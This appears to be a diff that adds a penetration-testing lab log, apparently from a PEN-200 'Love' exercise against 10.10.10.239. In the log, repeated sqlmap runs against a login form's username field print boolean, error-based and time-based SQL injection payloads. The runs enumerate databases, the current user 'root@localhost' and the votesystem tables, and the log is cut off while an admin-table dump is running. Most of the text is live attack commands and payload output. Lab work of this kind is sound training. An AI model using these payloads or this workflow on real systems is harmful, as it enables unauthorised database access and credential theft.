@@ -1,0 +1,428 @@
+┌──(kali㉿kali)-[~/pen200/Love]
+└─$ sqlmap -r login.req   -p username  --random-agent --level 5 --risk 3 --dbs --threads=10 --dbms=mysql
+        ___
+       __H__                                                                 
+ ___ ___[.]_____ ___ ___  {1.8.11#stable}                                    
+|_ -| . [']     | .'| . |                                                    
+|___|_  [,]_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:37:55 /2025-03-20/
+
+[14:37:55] [INFO] parsing HTTP request from 'login.req'
+[14:37:55] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                  
+[14:37:55] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://10.10.10.239/admin/index.php'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+[14:38:36] [INFO] checking if the target is protected by some kind of WAF/IPS
+[14:38:37] [INFO] testing if the target URL content is stable
+[14:38:40] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable                                                  
+[14:38:42] [INFO] testing for SQL injection on POST parameter 'username'
+[14:38:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:40:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[14:42:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'                                                                         
+[14:42:10] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable (with --string="Cannot find account with the username")
+[14:42:10] [INFO] testing 'Generic inline queries'
+[14:42:12] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                   
+[14:42:13] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'                                                        
+[14:42:14] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                               
+[14:42:15] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'                                                                    
+[14:42:16] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'                                       
+[14:42:18] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'                                                            
+[14:42:19] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                       
+[14:42:21] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'                                                            
+[14:42:23] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                             
+[14:42:25] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                              
+[14:42:27] [INFO] POST parameter 'username' is 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable              
+[14:42:27] [INFO] testing 'MySQL inline queries'
+[14:42:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[14:42:29] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[14:42:31] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'                                                                       
+[14:42:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[14:42:35] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'                                                                          
+[14:42:36] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[14:42:38] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[14:42:52] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable                                 
+[14:42:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[14:42:52] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[14:43:26] [INFO] target URL appears to be UNION injectable with 7 columns
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] n
+[14:45:59] [WARNING] if UNION based SQL injection is not detected, please consider usage of option '--union-char' (e.g. '--union-char=1') 
+[14:45:59] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'                                                                         
+[14:47:17] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
+[14:47:47] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'                                                                        
+[14:48:17] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
+[14:48:50] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'                                                                        
+[14:49:19] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
+[14:49:49] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'                                                                        
+[14:50:21] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
+[14:50:50] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'                                                                       
+[14:51:21] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[14:53:49] [INFO] testing 'MySQL UNION query (92) - 21 to 40 columns'
+[14:54:24] [INFO] testing 'MySQL UNION query (92) - 41 to 60 columns'
+[14:54:54] [INFO] testing 'MySQL UNION query (92) - 61 to 80 columns'
+[14:55:27] [INFO] testing 'MySQL UNION query (92) - 81 to 100 columns'
+[14:55:59] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 577 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: username=test' OR NOT 8085=8085-- QvOl&password=test&login=
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=test' OR (SELECT 6621 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT (ELT(6621=6621,1))),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VKRi&password=test&login=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=test' AND (SELECT 9410 FROM (SELECT(SLEEP(5)))Onrw)-- FmdX&password=test&login=
+---
+[15:02:26] [INFO] the back-end DBMS is MySQL
+[15:02:26] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[15:02:26] [WARNING] if the problem persists please try to lower the number of used threads (option '--threads')
+web application technology: PHP 7.3.27, Apache 2.4.46
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[15:02:33] [INFO] fetching database names
+[15:02:34] [INFO] starting 6 threads
+[15:02:36] [INFO] retrieved: 'phpmyadmin'
+[15:02:36] [INFO] retrieved: 'performance_schema'
+[15:02:36] [INFO] retrieved: 'information_schema'
+[15:02:36] [INFO] retrieved: 'mysql'
+[15:02:36] [INFO] retrieved: 'votesystem'
+[15:02:36] [INFO] retrieved: 'test'
+available databases [6]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] test
+[*] votesystem
+
+[15:02:36] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.10.239'                                            
+
+[*] ending @ 15:02:36 /2025-03-20/
+
+                                                                             
+┌──(kali㉿kali)-[~/pen200/Love]
+└─$ sqlmap -r login.req   -p username  --random-agent --level 5 --risk 3 --dbs --current-user -D votesystem --tables   --threads=10 --dbms=mysql -v 3 
+        ___
+       __H__                                                                 
+ ___ ___[(]_____ ___ ___  {1.8.11#stable}                                    
+|_ -| . [(]     | .'| . |                                                    
+|___|_  [.]_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:03:51 /2025-03-20/
+
+[15:03:51] [INFO] parsing HTTP request from 'login.req'
+[15:03:51] [DEBUG] cleaning up configuration parameters
+[15:03:51] [DEBUG] setting the HTTP timeout
+[15:03:51] [DEBUG] setting the HTTP User-Agent header
+[15:03:51] [DEBUG] loading random HTTP User-Agent header(s) from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                        
+[15:03:51] [INFO] fetched random HTTP User-Agent header value 'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; Media Center PC 3.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                               
+[15:03:51] [DEBUG] creating HTTP requests opener object
+[15:03:51] [DEBUG] forcing back-end DBMS to user defined value
+[15:03:51] [DEBUG] provided parameter 'username' is not inside the Cookie
+[15:03:51] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://10.10.10.239/admin/index.php'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+[15:03:59] [DEBUG] declared web page charset 'utf-8'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: username=test' OR NOT 8085=8085-- QvOl&password=test&login=
+    Vector: OR NOT [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=test' OR (SELECT 6621 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT (ELT(6621=6621,1))),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VKRi&password=test&login=
+    Vector: OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=test' AND (SELECT 9410 FROM (SELECT(SLEEP(5)))Onrw)-- FmdX&password=test&login=
+    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
+---
+[15:03:59] [INFO] testing MySQL
+[15:03:59] [DEBUG] resuming configuration option 'string' ('Cannot find account with the username')                                                       
+[15:03:59] [PAYLOAD] test' OR (SELECT 1397 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT (CASE WHEN (QUARTER(NULL XOR NULL) IS NULL) THEN 1 ELSE 0 END)),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VuEx
+[15:04:01] [DEBUG] performed 1 query in 1.99 seconds
+[15:04:01] [INFO] confirming MySQL
+[15:04:01] [PAYLOAD] test' OR (SELECT 3529 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT (CASE WHEN (SESSION_USER() LIKE USER()) THEN 1 ELSE 0 END)),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- QDLQ
+[15:04:03] [DEBUG] performed 1 query in 1.93 seconds
+[15:04:03] [PAYLOAD] test' OR (SELECT 3258 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT (CASE WHEN (ISNULL(JSON_STORAGE_FREE(NULL))) THEN 1 ELSE 0 END)),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- eSdD
+[15:04:05] [DEBUG] performed 1 query in 1.63 seconds
+[15:04:05] [PAYLOAD] test' OR (SELECT 8338 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT (CASE WHEN (ISNULL(TIMESTAMPADD(MINUTE,3667,NULL))) THEN 1 ELSE 0 END)),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- RVlX
+[15:04:07] [DEBUG] performed 1 query in 1.61 seconds
+[15:04:07] [INFO] the back-end DBMS is MySQL
+web application technology: Apache 2.4.46, PHP 7.3.27
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+[15:04:07] [INFO] fetching current user
+[15:04:07] [PAYLOAD] test' OR (SELECT 1884 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,51)),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- qeUw
+[15:04:08] [INFO] retrieved: 'root@localhost'
+[15:04:08] [DEBUG] performed 1 query in 1.61 seconds
+current user: 'root@localhost'
+[15:04:08] [INFO] fetching database names
+[15:04:08] [DEBUG] used SQL query returns 6 entries
+[15:04:08] [INFO] starting 6 threads
+[15:04:08] [INFO] resumed: 'information_schema'
+[15:04:08] [INFO] resumed: 'mysql'
+[15:04:08] [INFO] resumed: 'performance_schema'
+[15:04:08] [INFO] resumed: 'test'
+[15:04:08] [INFO] resumed: 'votesystem'
+[15:04:08] [INFO] resumed: 'phpmyadmin'
+[15:04:08] [DEBUG] performed 0 queries in 0.01 seconds
+available databases [6]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] test
+[*] votesystem
+
+[15:04:08] [INFO] fetching tables for database: 'votesystem'
+[15:04:08] [PAYLOAD] test' OR (SELECT 4606 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT IFNULL(CAST(COUNT(table_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x766f746573797374656d)),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- HZPM
+[15:04:10] [DEBUG] used SQL query returns 5 entries
+[15:04:10] [INFO] starting 5 threads
+[15:04:10] [PAYLOAD] test' OR (SELECT 5174 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(table_name AS NCHAR),0x20)),1,51) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x766f746573797374656d) LIMIT 0,1),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- XSQb
+[15:04:10] [PAYLOAD] test' OR (SELECT 6402 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(table_name AS NCHAR),0x20)),1,51) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x766f746573797374656d) LIMIT 1,1),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uviJ
+[15:04:10] [PAYLOAD] test' OR (SELECT 1692 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(table_name AS NCHAR),0x20)),1,51) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x766f746573797374656d) LIMIT 2,1),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- AUSe
+[15:04:10] [PAYLOAD] test' OR (SELECT 1223 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(table_name AS NCHAR),0x20)),1,51) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x766f746573797374656d) LIMIT 3,1),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- AkgQ
+[15:04:10] [PAYLOAD] test' OR (SELECT 4838 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(table_name AS NCHAR),0x20)),1,51) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x766f746573797374656d) LIMIT 4,1),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BDPL
+[15:04:11] [INFO] retrieved: 'admin'
+[15:04:11] [INFO] retrieved: 'voters'
+[15:04:12] [INFO] retrieved: 'candidates'
+[15:04:12] [INFO] retrieved: 'positions'
+[15:04:12] [INFO] retrieved: 'votes'
+[15:04:12] [DEBUG] performed 6 queries in 3.73 seconds
+Database: votesystem
+[5 tables]
++------------+
+| admin      |
+| candidates |
+| positions  |
+| voters     |
+| votes      |
++------------+
+
+[15:04:12] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.10.239'                                            
+
+[*] ending @ 15:04:12 /2025-03-20/
+
+                                                                             
+┌──(kali㉿kali)-[~/pen200/Love]
+└─$ 
+                                                                             
+┌──(kali㉿kali)-[~/pen200/Love]
+└─$ sqlmap -r login.req   -p username  --random-agent --level 5 --risk 3 --dbs --current-user -D votesystem -T admin   --threads=10 --dbms=mysql -v 3 
+        ___
+       __H__                                                                 
+ ___ ___[,]_____ ___ ___  {1.8.11#stable}                                    
+|_ -| . ["]     | .'| . |                                                    
+|___|_  [,]_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:08:10 /2025-03-20/
+
+[15:08:10] [INFO] parsing HTTP request from 'login.req'
+[15:08:10] [DEBUG] cleaning up configuration parameters
+[15:08:10] [DEBUG] setting the HTTP timeout
+[15:08:10] [DEBUG] setting the HTTP User-Agent header
+[15:08:10] [DEBUG] loading random HTTP User-Agent header(s) from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                        
+[15:08:10] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 5.1; U; fr) Opera 8.51' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                                                  
+[15:08:10] [DEBUG] creating HTTP requests opener object
+[15:08:10] [DEBUG] forcing back-end DBMS to user defined value
+[15:08:10] [DEBUG] provided parameter 'username' is not inside the Cookie
+[15:08:10] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://10.10.10.239/admin/index.php'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+[15:08:14] [DEBUG] declared web page charset 'utf-8'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: username=test' OR NOT 8085=8085-- QvOl&password=test&login=
+    Vector: OR NOT [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=test' OR (SELECT 6621 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT (ELT(6621=6621,1))),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VKRi&password=test&login=
+    Vector: OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=test' AND (SELECT 9410 FROM (SELECT(SLEEP(5)))Onrw)-- FmdX&password=test&login=
+    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
+---
+[15:08:14] [INFO] testing MySQL
+[15:08:14] [DEBUG] resuming configuration option 'string' ('Cannot find account with the username')                                                       
+[15:08:14] [DEBUG] performed 0 queries in 0.00 seconds
+[15:08:14] [INFO] confirming MySQL
+[15:08:14] [DEBUG] performed 0 queries in 0.00 seconds
+[15:08:14] [PAYLOAD] test' OR (SELECT 8837 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT (CASE WHEN (ISNULL(JSON_STORAGE_FREE(NULL))) THEN 1 ELSE 0 END)),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- wsvM
+[15:08:16] [DEBUG] performed 1 query in 1.71 seconds
+[15:08:16] [DEBUG] performed 0 queries in 0.00 seconds
+[15:08:16] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 7.3.27, Apache 2.4.46
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+[15:08:16] [INFO] fetching current user
+[15:08:16] [INFO] resumed: 'root@localhost'
+[15:08:16] [DEBUG] performed 0 queries in 0.00 seconds
+current user: 'root@localhost'
+[15:08:16] [INFO] fetching database names
+[15:08:16] [DEBUG] used SQL query returns 6 entries
+[15:08:16] [INFO] starting 6 threads
+[15:08:16] [INFO] resumed: 'information_schema'
+[15:08:16] [INFO] resumed: 'performance_schema'
+[15:08:16] [INFO] resumed: 'phpmyadmin'
+[15:08:16] [INFO] resumed: 'test'
+[15:08:16] [INFO] resumed: 'votesystem'
+[15:08:16] [INFO] resumed: 'mysql'
+[15:08:16] [DEBUG] performed 0 queries in 0.00 seconds
+available databases [6]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] test
+[*] votesystem
+
+[15:08:16] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.10.239'                                            
+
+[*] ending @ 15:08:16 /2025-03-20/
+
+                                                                             
+┌──(kali㉿kali)-[~/pen200/Love]
+└─$ sqlmap -r login.req   -p username  --random-agent --level 5 --risk 3   -D votesystem -T admin  --dump   --threads=10 --dbms=mysql -v 3  
+        ___
+       __H__                                                                 
+ ___ ___[']_____ ___ ___  {1.8.11#stable}                                    
+|_ -| . ["]     | .'| . |                                                    
+|___|_  [,]_|_|_|__,|  _|                                                    
+      |_|V...       |_|   https://sqlmap.org                                 
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:09:43 /2025-03-20/
+
+[15:09:43] [INFO] parsing HTTP request from 'login.req'
+[15:09:43] [DEBUG] cleaning up configuration parameters
+[15:09:43] [DEBUG] setting the HTTP timeout
+[15:09:43] [DEBUG] setting the HTTP User-Agent header
+[15:09:43] [DEBUG] loading random HTTP User-Agent header(s) from file '/usr/share/sqlmap/data/txt/user-agents.txt'                                        
+[15:09:43] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.16) Gecko/20080716 Firefox/2.0.0.16' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                   
+[15:09:43] [DEBUG] creating HTTP requests opener object
+[15:09:43] [DEBUG] forcing back-end DBMS to user defined value
+[15:09:43] [DEBUG] provided parameter 'username' is not inside the Cookie
+[15:09:43] [INFO] testing connection to the target URL
+got a 302 redirect to 'http://10.10.10.239/admin/index.php'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+[15:09:47] [DEBUG] declared web page charset 'utf-8'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: username=test' OR NOT 8085=8085-- QvOl&password=test&login=
+    Vector: OR NOT [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=test' OR (SELECT 6621 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT (ELT(6621=6621,1))),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VKRi&password=test&login=
+    Vector: OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=test' AND (SELECT 9410 FROM (SELECT(SLEEP(5)))Onrw)-- FmdX&password=test&login=
+    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
+---
+[15:09:47] [INFO] testing MySQL
+[15:09:47] [DEBUG] resuming configuration option 'string' ('Cannot find account with the username')                                                       
+[15:09:47] [DEBUG] performed 0 queries in 0.00 seconds
+[15:09:47] [INFO] confirming MySQL
+[15:09:47] [DEBUG] performed 0 queries in 0.00 seconds
+[15:09:47] [PAYLOAD] test' OR (SELECT 8858 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT (CASE WHEN (ISNULL(JSON_STORAGE_FREE(NULL))) THEN 1 ELSE 0 END)),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- zdNL
+[15:09:48] [DEBUG] performed 1 query in 1.13 seconds
+[15:09:48] [DEBUG] performed 0 queries in 0.00 seconds
+[15:09:48] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 7.3.27, Apache 2.4.46
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+[15:09:48] [INFO] fetching columns for table 'admin' in database 'votesystem'
+[15:09:48] [PAYLOAD] test' OR (SELECT 9103 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x766f746573797374656d),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- efdK
+[15:09:49] [DEBUG] used SQL query returns 7 entries
+[15:09:49] [INFO] starting 7 threads
+[15:09:49] [PAYLOAD] test' OR (SELECT 3451 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(column_name AS NCHAR),0x20)),1,51) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x766f746573797374656d LIMIT 0,1),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- btKl
+[15:09:49] [PAYLOAD] test' OR (SELECT 9146 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(column_name AS NCHAR),0x20)),1,51) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x766f746573797374656d LIMIT 1,1),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- MgXa
+[15:09:49] [PAYLOAD] test' OR (SELECT 4242 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(column_name AS NCHAR),0x20)),1,51) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x766f746573797374656d LIMIT 6,1),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- qQBn
+[15:09:49] [PAYLOAD] test' OR (SELECT 4237 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(column_name AS NCHAR),0x20)),1,51) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x766f746573797374656d LIMIT 4,1),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- oOCc
+[15:09:49] [PAYLOAD] test' OR (SELECT 4086 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(column_name AS NCHAR),0x20)),1,51) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x766f746573797374656d LIMIT 5,1),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VumV
+[15:09:49] [PAYLOAD] test' OR (SELECT 7544 FROM(SELECT COUNT(*),CONCAT(0x716a717071,(SELECT MID((IFNULL(CAST(column_name AS NCHAR),0x20)),1,51) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x766f746573797374656d LIMIT 2,1),0x71767a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ObtA
